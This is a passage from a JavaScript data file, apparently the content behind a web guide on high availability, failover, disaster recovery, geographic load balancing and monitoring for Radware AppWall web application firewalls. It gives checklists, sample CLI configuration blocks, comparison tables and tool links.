            title: '11.3 Disaster Recovery',
            icon: 'fa-first-aid',
            items: [
                { id: '11.3.1', text: 'Create disaster recovery procedures and documentation', priority: 'critical' },
                { id: '11.3.2', text: 'Configure geographically distributed redundancy', priority: 'high' },
                { id: '11.3.3', text: 'Set up configuration backups and restoration', priority: 'critical' },
                { id: '11.3.4', text: 'Implement DR testing and validation procedures', priority: 'high' },
                { id: '11.3.5', text: 'Configure alternative traffic routing mechanisms', priority: 'medium' },
                { id: '11.3.6', text: 'Set up recovery time objectives (RTO) monitoring', priority: 'medium' },
                { id: '11.3.7', text: 'Implement Radware Cloud WAF DR integration', priority: 'high' },
                { id: '11.3.8', text: 'Configure automated configuration rollback capabilities', priority: 'medium' },
                { id: '11.3.9', text: 'Set up multi-site DR orchestration', priority: 'high' },
                { id: '11.3.10', text: 'Implement DNS-based DR failover mechanisms', priority: 'medium' }
            ]
        },
        {
            title: '11.4 Load Balancing & Traffic Distribution',
            icon: 'fa-balance-scale',
            items: [
                { id: '11.4.1', text: 'Configure Radware FastView for optimized resource distribution', priority: 'high' },
                { id: '11.4.2', text: 'Set up geographic load balancing for global resilience', priority: 'medium' },
                { id: '11.4.3', text: 'Implement application-aware traffic distribution', priority: 'high' },
                { id: '11.4.4', text: 'Configure session persistence across load-balanced WAF nodes', priority: 'critical' },
                { id: '11.4.5', text: 'Set up health checks for intelligent traffic routing', priority: 'high' },
                { id: '11.4.6', text: 'Implement bandwidth management during failover', priority: 'medium' },
                { id: '11.4.7', text: 'Configure Radware AppDirector integration', priority: 'medium' },
                { id: '11.4.8', text: 'Set up SSL offloading in distributed environments', priority: 'high' }
            ]
        },
        {
            title: '11.5 Performance Optimization',
            icon: 'fa-tachometer-alt',
            items: [
                { id: '11.5.1', text: 'Configure connection pooling across cluster nodes', priority: 'high' },
                { id: '11.5.2', text: 'Set up optimized synchronization intervals', priority: 'medium' },
                { id: '11.5.3', text: 'Implement resource-aware scaling during failover', priority: 'high' },
                { id: '11.5.4', text: 'Configure RAM caching for accelerated failover', priority: 'medium' },
                { id: '11.5.5', text: 'Set up FastView acceleration for HA environments', priority: 'high' },
                { id: '11.5.6', text: 'Implement adaptive resource allocation', priority: 'medium' },
                { id: '11.5.7', text: 'Configure network optimization for cluster traffic', priority: 'high' }
            ]
        },
        {
            title: '11.6 Monitoring & Alerting',
            icon: 'fa-bell',
            items: [
                { id: '11.6.1', text: 'Set up dedicated monitoring for HA components', priority: 'critical' },
                { id: '11.6.2', text: 'Configure progressive alerting thresholds', priority: 'high' },
                { id: '11.6.3', text: 'Implement automated health check reporting', priority: 'medium' },
                { id: '11.6.4', text: 'Set up Vision integration for cluster monitoring', priority: 'high' },
                { id: '11.6.5', text: 'Configure SNMP traps for failover events', priority: 'medium' },
                { id: '11.6.6', text: 'Implement Syslog forwarding for cluster events', priority: 'medium' },
                { id: '11.6.7', text: 'Set up automated performance baseline monitoring', priority: 'high' },
                { id: '11.6.8', text: 'Configure APSolute Vision Reporter integration', priority: 'medium' }
            ]
        }
    ],
    techniques: [
        {
            title: 'High Availability Cluster Configuration for Radware WAF',
            content: `
                <p class="mb-4 text-gray-700">Configure Radware AppWall in a high-availability cluster to ensure continuous protection and zero downtime.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure Radware AppWall high availability cluster</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">system</span> high-availability</div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">mode</span> <span class="code-value">active-passive</span></div>
                    <div><span class="code-param">group-id</span> <span class="code-value">1</span></div>
                    <div><span class="code-param">priority</span> <span class="code-value">100</span></div>
                    <div><span class="code-param">sync-interface</span> <span class="code-value">eth3</span></div>
                    <div><span class="code-param">heartbeat-interface</span> <span class="code-value">eth3</span></div>
                    <div><span class="code-param">heartbeat-interval</span> <span class="code-value">1</span></div>
                    <div><span class="code-param">dead-interval</span> <span class="code-value">4</span></div>
                    <div class="code-comment"># Configure Radware-specific synchronization options</div>
                    <div><span class="code-command">radware-sync</span></div>
                    <div><span class="code-param">ssl-keys</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">security-policies</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">custom-signatures</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">learning-data</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure split-brain prevention</div>
                    <div><span class="code-command">split-brain-prevention</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">arbitration-device</span> <span class="code-value">10.0.0.250</span></div>
                    <div class="code-comment"># Configure virtual addresses</div>
                    <div><span class="code-command">virtual-address</span> <span class="code-value">add</span> <span class="code-param">interface</span> <span class="code-value">eth1</span> <span class="code-param">address</span> <span class="code-value">203.0.113.100/24</span></div>
                    <div><span class="code-command">peer</span></div>
                    <div><span class="code-param">address</span> <span class="code-value">10.0.0.102</span></div>
                    <div><span class="code-param">authentication-key</span> <span class="code-value">"secure-ha-key"</span></div>
                    <div><span class="code-param">encryption</span> <span class="code-value">aes-256</span></div>
                    <div class="code-comment"># Configure session synchronization</div>
                    <div><span class="code-command">sync</span></div>
                    <div><span class="code-param">config</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">sessions</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">interval</span> <span class="code-value">60</span></div>
                    <div><span class="code-param">bandwidth-limit</span> <span class="code-value">100M</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Radware AppWall HA Cluster Modes Comparison</h5>
                <p class="mb-4 text-gray-700">Different high availability modes with their advantages and trade-offs:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">HA Mode</th>
                            <th class="p-3 border bg-gray-100">Description</th>
                            <th class="p-3 border bg-gray-100">Advantages</th>
                            <th class="p-3 border bg-gray-100">Disadvantages</th>
                            <th class="p-3 border bg-gray-100">Radware-Specific Features</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Active-Passive</td>
                            <td class="p-3 border">One active node processes traffic; standby node takes over on failure</td>
                            <td class="p-3 border">Simple configuration, clean failover, consistent performance</td>
                            <td class="p-3 border">Idle hardware resources during normal operation</td>
                            <td class="p-3 border">Full DefensePro integration, synchronized learning</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Active-Active</td>
                            <td class="p-3 border">Both nodes actively process traffic simultaneously</td>
                            <td class="p-3 border">Efficient resource utilization, load balancing</td>
                            <td class="p-3 border">More complex, potential for split-brain issues</td>
                            <td class="p-3 border">FastView acceleration, shared policy learning</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">N+1 Redundancy</td>
                            <td class="p-3 border">Multiple active nodes with one or more shared standby nodes</td>
                            <td class="p-3 border">Cost-effective for large deployments</td>
                            <td class="p-3 border">Complex configuration, potential capacity issues during failure</td>
                            <td class="p-3 border">APSolute Vision central management, policy grouping</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">N+N Redundancy</td>
                            <td class="p-3 border">Full redundant set of nodes</td>
                            <td class="p-3 border">Maximum resilience, no performance degradation during failure</td>
                            <td class="p-3 border">Highest cost, complex synchronization</td>
                            <td class="p-3 border">Multi-zone protection, advanced traffic distribution</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Hybrid Mode</td>
                            <td class="p-3 border">Mix of active-active and active-passive configurations</td>
                            <td class="p-3 border">Flexible resource allocation, optimized for specific traffic patterns</td>
                            <td class="p-3 border">Requires advanced configuration knowledge</td>
                            <td class="p-3 border">Intelligent traffic steering, contextual distribution</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Radware AppWall Cluster Synchronization</h5>
                <p class="mb-4 text-gray-700">Key elements to synchronize between cluster nodes:</p>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Security Policies:</strong> WAF rules, signature sets, and custom signatures</li>
                    <li class="mb-2"><strong>SSL Keys and Certificates:</strong> For seamless SSL inspection during failover</li>
                    <li class="mb-2"><strong>Session Information:</strong> Active client sessions and state tracking</li>
                    <li class="mb-2"><strong>Learning Data:</strong> Synchronized positive security model data</li>
                    <li class="mb-2"><strong>Custom Rules:</strong> User-defined security policies and exceptions</li>
                    <li class="mb-2"><strong>Global Parameters:</strong> System-wide configuration settings</li>
                    <li><strong>Network Configuration:</strong> Interface settings, routing tables, and virtual addresses</li>
                </ul>
            `
        },
        {
            title: 'Radware AppWall Failover Configuration',
            content: `
                <p class="mb-4 text-gray-700">Configure advanced failover mechanisms in Radware AppWall to ensure seamless protection during hardware or software failures.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure Radware AppWall failover settings</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">system</span> high-availability</div>
                    <div><span class="code-command">failover</span></div>
                    <div class="code-comment"># Automatic failover triggers</div>
                    <div><span class="code-param">auto-failover</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">trigger</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"interface-failure"</span></div>
                    <div><span class="code-command">trigger</span> <span class="code-value">"interface-failure"</span></div>
                    <div><span class="code-param">condition</span> <span class="code-value">interface-down</span></div>
                    <div><span class="code-param">interfaces</span> <span class="code-value">eth1,eth2</span></div>
                    <div><span class="code-param">consecutive-failures</span> <span class="code-value">3</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div><span class="code-command">trigger</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"service-failure"</span></div>
                    <div><span class="code-command">trigger</span> <span class="code-value">"service-failure"</span></div>
                    <div><span class="code-param">condition</span> <span class="code-value">service-down</span></div>
                    <div><span class="code-param">services</span> <span class="code-value">appwall,http</span></div>
                    <div><span class="code-param">check-interval</span> <span class="code-value">5</span></div>
                    <div><span class="code-param">consecutive-failures</span> <span class="code-value">2</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Advanced Radware-specific triggers</div>
                    <div><span class="code-command">trigger</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"security-bypass"</span></div>
                    <div><span class="code-command">trigger</span> <span class="code-value">"security-bypass"</span></div>
                    <div><span class="code-param">condition</span> <span class="code-value">security-engine-down</span></div>
                    <div><span class="code-param">consecutive-failures</span> <span class="code-value">1</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div><span class="code-command">trigger</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"cpu-threshold"</span></div>
                    <div><span class="code-command">trigger</span> <span class="code-value">"cpu-threshold"</span></div>
                    <div><span class="code-param">condition</span> <span class="code-value">resource</span></div>
                    <div><span class="code-param">resource-type</span> <span class="code-value">cpu</span></div>
                    <div><span class="code-param">threshold</span> <span class="code-value">95</span></div>
                    <div><span class="code-param">duration</span> <span class="code-value">60</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Stateful failover configuration</div>
                    <div><span class="code-command">stateful-failover</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">connection-mirroring</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">ssl-session-mirroring</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">session-persistence</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Failover notification</div>
                    <div><span class="code-command">notifications</span></div>
                    <div><span class="code-param">email</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">recipients</span> <span class="code-value">waf-admins@example.com,oncall@example.com</span></div>
                    <div><span class="code-param">snmp-trap</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">syslog</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">vision-alert</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">vision-server</span> <span class="code-value">10.0.0.200</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Radware-Specific Failover Testing Procedures</h5>
                <p class="mb-4 text-gray-700">Comprehensive testing recommendations for Radware AppWall:</p>
                <ol class="list-decimal pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Scheduled Testing:</strong> Perform planned failover tests during maintenance windows</li>
                    <li class="mb-2"><strong>Interface Testing:</strong> Simulate network interface failures on protected and management interfaces</li>
                    <li class="mb-2"><strong>Process Failure Testing:</strong> Verify behavior when core Radware services fail</li>
                    <li class="mb-2"><strong>Power Failure Testing:</strong> Test complete power loss scenarios with varying recovery timelines</li>
                    <li class="mb-2"><strong>Split-Brain Testing:</strong> Validate split-brain detection and prevention mechanisms</li>
                    <li class="mb-2"><strong>Security Bypass Testing:</strong> Verify failover when security engines enter bypass mode</li>
                    <li class="mb-2"><strong>Resource Exhaustion Testing:</strong> Test behavior when system resources are depleted</li>
                    <li class="mb-2"><strong>Traffic Pattern Testing:</strong> Verify failover under various traffic patterns and loads</li>
                    <li class="mb-2"><strong>Recovery Testing:</strong> Validate automatic recovery when failed node returns</li>
                    <li class="mb-2"><strong>SSL Session Persistence:</strong> Verify SSL session persistence during failover events</li>
                </ol>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Radware AppWall Failover Modes</h5>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Failover Mode</th>
                            <th class="p-3 border bg-gray-100">Description</th>
                            <th class="p-3 border bg-gray-100">Optimal Use Case</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Stateful Failover</td>
                            <td class="p-3 border">Maintains all session states and connections during failover</td>
                            <td class="p-3 border">Critical applications requiring zero connection loss</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Stateless Failover</td>
                            <td class="p-3 border">Fast failover without session state transfer</td>
                            <td class="p-3 border">Applications that can handle reconnections</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Graceful Failover</td>
                            <td class="p-3 border">Controlled transition with minimal disruption</td>
                            <td class="p-3 border">Planned maintenance or upgrades</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Forced Failover</td>
                            <td class="p-3 border">Immediate transition regardless of conditions</td>
                            <td class="p-3 border">Emergency scenarios requiring immediate action</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Partial Failover</td>
                            <td class="p-3 border">Only affected services transition to standby node</td>
                            <td class="p-3 border">High-traffic environments with isolated failures</td>
                        </tr>
                    </tbody>
                </table>
            `
        },
        {
            title: 'Radware AppWall Disaster Recovery Planning',
            content: `
                <p class="mb-4 text-gray-700">Configure comprehensive disaster recovery capabilities for Radware AppWall to ensure WAF protection even during catastrophic failures.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure Radware AppWall disaster recovery</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">system</span> disaster-recovery</div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configuration backup</div>
                    <div><span class="code-command">backup</span></div>
                    <div><span class="code-param">schedule</span> <span class="code-value">daily</span></div>
                    <div><span class="code-param">time</span> <span class="code-value">02:00</span></div>
                    <div><span class="code-param">retention</span> <span class="code-value">30</span></div>
                    <div><span class="code-param">location</span> <span class="code-value">s3</span></div>
                    <div><span class="code-param">s3-bucket</span> <span class="code-value">appwall-backups</span></div>
                    <div><span class="code-param">s3-region</span> <span class="code-value">us-east-1</span></div>
                    <div><span class="code-param">encryption</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">encryption-key</span> <span class="code-value">"secure-dr-key"</span></div>
                    <div class="code-comment"># Radware-specific backup elements</div>
                    <div><span class="code-command">backup-elements</span></div>
                    <div><span class="code-param">system-config</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">security-policies</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">custom-signatures</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">ssl-certificates</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">learning-data</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">logs</span> <span class="code-value">disable</span></div>
                    <div class="code-comment"># Geo-redundancy configuration</div>
                    <div><span class="code-command">geo-redundancy</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">primary-site</span> <span class="code-value">east</span></div>
                    <div><span class="code-param">secondary-site</span> <span class="code-value">west</span></div>
                    <div><span class="code-param">sync-mode</span> <span class="code-value">async</span></div>
                    <div><span class="code-param">sync-interval</span> <span class="code-value">300</span></div>
                    <div class="code-comment"># Cloud DR integration</div>
                    <div><span class="code-command">cloud-dr</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">cloud-waf-url</span> <span class="code-value">https://cloudwaf.radware.com</span></div>
                    <div><span class="code-param">api-key</span> <span class="code-value">"cloud-api-key"</span></div>
                    <div><span class="code-param">policy-sync</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Recovery objectives</div>
                    <div><span class="code-param">rto</span> <span class="code-value">15</span></div>
                    <div><span class="code-param">rpo</span> <span class="code-value">5</span></div>
                    <div class="code-comment"># Recovery validation</div>
                    <div><span class="code-command">validation</span></div>
                    <div><span class="code-param">schedule</span> <span class="code-value">monthly</span></div>
                    <div><span class="code-param">day</span> <span class="code-value">first-sunday</span></div>
                    <div><span class="code-param">time</span> <span class="code-value">03:00</span></div>
                    <div><span class="code-param">reports-to</span> <span class="code-value">dr-team@example.com</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Radware AppWall DR Implementation Guide</h5>
                <p class="mb-4 text-gray-700">Essential elements of a comprehensive DR plan for Radware WAF:</p>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Recovery Scope:</strong> Define precisely which Radware components are covered</li>
                    <li class="mb-2"><strong>Recovery Objectives:</strong> Establish RTO (Recovery Time Objective) and RPO (Recovery Point Objective)</li>
                    <li class="mb-2"><strong>Team Responsibilities:</strong> Clear roles and responsibilities with Radware product-specific expertise</li>
                    <li class="mb-2"><strong>Communication Plan:</strong> Structured communication procedures during DR events</li>
                    <li class="mb-2"><strong>Recovery Procedures:</strong> Detailed step-by-step instructions for restoring Radware services</li>
                    <li class="mb-2"><strong>Escalation Procedures:</strong> When and how to engage Radware support during DR</li>
                    <li class="mb-2"><strong>Testing Schedule:</strong> Regular validation with Radware-specific test cases</li>
                    <li class="mb-2"><strong>Documentation Maintenance:</strong> Process for keeping the plan updated with current Radware configurations</li>
                </ul>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Radware Cloud WAF Integration for DR</h5>
                <p class="mb-4 text-gray-700">Leverage Radware's cloud WAF capabilities for disaster recovery:</p>
                <ol class="list-decimal pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Policy Synchronization:</strong> Keep on-premises and cloud WAF policies synchronized</li>
                    <li class="mb-2"><strong>DNS Failover:</strong> Configure DNS-based traffic redirection to cloud WAF</li>
                    <li class="mb-2"><strong>BGP Routing:</strong> Use BGP announcements for seamless traffic redirection</li>
                    <li class="mb-2"><strong>Global Server Load Balancing:</strong> Implement GSLB for intelligent failover</li>
                    <li class="mb-2"><strong>Hybrid Protection:</strong> Configure always-on hybrid protection model</li>
                    <li class="mb-2"><strong>API Integration:</strong> Automate failover through Radware API calls</li>
                    <li class="mb-2"><strong>Traffic Validation:</strong> Configure validation mechanisms for failover verification</li>
                </ol>
            `
        },
        {
            title: 'Geographic Load Balancing for Radware WAF',
            content: `
                <p class="mb-4 text-gray-700">Configure Radware's geographic load balancing capabilities to enhance availability across multiple regions.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure Radware geographic load balancing</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">system</span> global-server-load-balancing</div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">zones</span></div>
                    <div class="code-comment"># Primary data center configuration</div>
                    <div><span class="code-command">zone</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"primary-dc"</span></div>
                    <div><span class="code-command">zone</span> <span class="code-value">"primary-dc"</span></div>
                    <div><span class="code-param">location</span> <span class="code-value">us-east</span></div>
                    <div><span class="code-param">priority</span> <span class="code-value">10</span></div>
                    <div><span class="code-param">devices</span> <span class="code-value">10.0.1.10,10.0.1.11</span></div>
                    <div><span class="code-param">health-check</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Secondary data center configuration</div>
                    <div><span class="code-command">zone</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"secondary-dc"</span></div>
                    <div><span class="code-command">zone</span> <span class="code-value">"secondary-dc"</span></div>
                    <div><span class="code-param">location</span> <span class="code-value">us-west</span></div>
                    <div><span class="code-param">priority</span> <span class="code-value">20</span></div>
                    <div><span class="code-param">devices</span> <span class="code-value">10.0.2.10,10.0.2.11</span></div>
                    <div><span class="code-param">health-check</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Distribution policy configuration</div>
                    <div><span class="code-command">policy</span></div>
                    <div><span class="code-param">method</span> <span class="code-value">proximity</span></div>
                    <div><span class="code-param">fallback</span> <span class="code-value">round-robin</span></div>
                    <div><span class="code-param">persistence</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">persistence-timeout</span> <span class="code-value">300</span></div>
                    <div class="code-comment"># Health monitoring configuration</div>
                    <div><span class="code-command">monitoring</span></div>
                    <div><span class="code-param">health-check-interval</span> <span class="code-value">30</span></div>
                    <div><span class="code-param">failure-threshold</span> <span class="code-value">3</span></div>
                    <div><span class="code-param">recovery-threshold</span> <span class="code-value">2</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Radware Geographic Distribution Methods</h5>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Distribution Method</th>
                            <th class="p-3 border bg-gray-100">Description</th>
                            <th class="p-3 border bg-gray-100">Best Use Case</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Proximity-Based</td>
                            <td class="p-3 border">Routes traffic to nearest geographic location</td>
                            <td class="p-3 border">Global user base with latency-sensitive applications</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Round-Robin</td>
                            <td class="p-3 border">Distributes traffic equally across locations</td>
                            <td class="p-3 border">Even load distribution when latency is not critical</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Weighted Distribution</td>
                            <td class="p-3 border">Allocates traffic based on site capacity</td>
                            <td class="p-3 border">Sites with different processing capabilities</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Dynamic Health</td>
                            <td class="p-3 border">Routes based on real-time health metrics</td>
                            <td class="p-3 border">Environments with fluctuating performance</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Static Priority</td>
                            <td class="p-3 border">Uses predefined priority order</td>
                            <td class="p-3 border">Primary/backup site configurations</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Regulatory Compliance</td>
                            <td class="p-3 border">Routes based on data sovereignty requirements</td>
                            <td class="p-3 border">Applications with strict regulatory requirements</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Geographic Load Balancing Benefits for Radware WAF</h5>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Continuous Availability:</strong> Maintain protection even during regional outages</li>
                    <li class="mb-2"><strong>Reduced Latency:</strong> Route traffic to nearest WAF instance</li>
                    <li class="mb-2"><strong>Regulatory Compliance:</strong> Keep traffic within required geographic boundaries</li>
                    <li class="mb-2"><strong>Attack Mitigation:</strong> Distribute attack traffic across multiple instances</li>
                    <li class="mb-2"><strong>Capacity Management:</strong> Route traffic based on real-time capacity</li>
                    <li class="mb-2"><strong>Disaster Recovery:</strong> Automated traffic routing during site failures</li>
                </ul>
            `
        },
        {
            title: 'Advanced HA Monitoring for Radware WAF',
            content: `
                <p class="mb-4 text-gray-700">Implement comprehensive monitoring solutions for Radware AppWall high availability environments.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure advanced HA monitoring</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">system</span> monitoring</div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># SNMP monitoring configuration</div>
                    <div><span class="code-command">snmp</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">version</span> <span class="code-value">v3</span></div>
                    <div><span class="code-param">community</span> <span class="code-value">"radware-public"</span></div>
                    <div><span class="code-param">trap-receivers</span> <span class="code-value">10.0.0.50,10.0.0.51</span></div>
                    <div><span class="code-param">ha-traps</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Syslog configuration</div>
                    <div><span class="code-command">syslog</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">servers</span> <span class="code-value">10.0.0.60,10.0.0.61</span></div>
                    <div><span class="code-param">facility</span> <span class="code-value">local4</span></div>
                    <div><span class="code-param">ha-events</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># APSolute Vision integration</div>
                    <div><span class="code-command">vision</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">server</span> <span class="code-value">10.0.0.100</span></div>
                    <div><span class="code-param">authentication-key</span> <span class="code-value">"vision-key"</span></div>
                    <div><span class="code-param">reporting-interval</span> <span class="code-value">60</span></div>
                    <div class="code-comment"># HA-specific monitoring</div>
                    <div><span class="code-command">ha-monitoring</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">sync-status</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">heartbeat-status</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">resource-utilization</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">configuration-consistency</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Critical Monitoring Metrics for Radware HA</h5>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Metric Category</th>
                            <th class="p-3 border bg-gray-100">Key Metrics</th>
                            <th class="p-3 border bg-gray-100">Warning Thresholds</th>
                            <th class="p-3 border bg-gray-100">Critical Thresholds</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Synchronization</td>
                            <td class="p-3 border">Sync Latency, Config Consistency</td>
                            <td class="p-3 border">Latency > 5s, Minor Inconsistencies</td>
                            <td class="p-3 border">Latency > 30s, Major Inconsistencies</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Heartbeat</td>
                            <td class="p-3 border">Packet Loss, Response Time</td>
                            <td class="p-3 border">Loss > 1%, Response > 50ms</td>
                            <td class="p-3 border">Loss > 5%, Response > 200ms</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Resource Utilization</td>
                            <td class="p-3 border">CPU, Memory, Connections</td>
                            <td class="p-3 border">CPU > 70%, Memory > 80%</td>
                            <td class="p-3 border">CPU > 90%, Memory > 95%</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Network</td>
                            <td class="p-3 border">Interface Errors, Throughput</td>
                            <td class="p-3 border">Errors > 0.1%, Throughput > 70%</td>
                            <td class="p-3 border">Errors > 1%, Throughput > 90%</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Security Processing</td>
                            <td class="p-3 border">Engine Status, Processing Latency</td>
                            <td class="p-3 border">Latency > 10ms, Minor Errors</td>
                            <td class="p-3 border">Latency > 50ms, Processing Errors</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">APSolute Vision Monitoring Dashboard</h5>
                <p class="mb-4 text-gray-700">Key elements to include in your HA monitoring dashboard:</p>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Cluster Status Overview:</strong> At-a-glance view of all HA clusters</li>
                    <li class="mb-2"><strong>Node Role Indicators:</strong> Visual indication of active/standby status</li>
                    <li class="mb-2"><strong>Synchronization Health:</strong> Metrics on configuration and session sync</li>
                    <li class="mb-2"><strong>Failover History:</strong> Timeline of previous failover events</li>
                    <li class="mb-2"><strong>Resource Utilization:</strong> Comparative resource usage across nodes</li>
                    <li class="mb-2"><strong>Network Health:</strong> Status of critical network interfaces</li>
                    <li class="mb-2"><strong>Security Engine Status:</strong> Health of WAF inspection engines</li>
                    <li class="mb-2"><strong>Alert History:</strong> Recent warnings and critical events</li>
                </ul>
            `
        }
    ],
    tools: [
        {
            title: 'Radware HA Failover Testing Tool',
            icon: 'fa-toggle-on',
            description: 'Official Radware tool for testing and validating AppWall failover functionality.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'AppWall Tools'
        },
        {
            title: 'AppWall Cluster Monitoring',
            icon: 'fa-heartbeat',
            description: 'Monitor cluster health and synchronization status for Radware WAF.',
            link: 'https://www.nagios.org/',
            linkText: 'Nagios'
        },
        {
            title: 'Radware Configuration Backup Manager',
            icon: 'fa-save',
